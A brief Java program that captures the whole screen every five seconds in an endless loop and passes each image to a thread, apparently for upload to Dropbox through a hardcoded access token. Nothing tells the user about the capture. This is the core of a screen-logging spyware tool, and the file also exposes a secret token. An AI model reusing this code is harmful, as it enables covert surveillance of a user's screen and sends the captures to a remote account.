import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.awt.*;
import java.awt.image.BufferedImage;
public class Main {
    public static void main(String[] args) throws Exception {
        String ACCESS_TOKEN = "sl.Aq8CQaJNa1HFvEBvgXrq0t7L9FBnSpi4pCV5EAdOn4SMF8srLK3OV4XjwuiL_chZr2j3PFudpO75t3qW1XDk4R5wswzs6miq6OydB6D-KFbBWHQ7tKIrGN6NSkFlKb17_kA071M";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        while (true) {
            BufferedImage screenShot = new Robot()
                    .createScreenCapture(new Rectangle(Toolkit
                            .getDefaultToolkit().getScreenSize()));
            MyThread thread = new MyThread(client, screenShot);
            thread.start();
            Thread.sleep(5000);
        }
    }
}
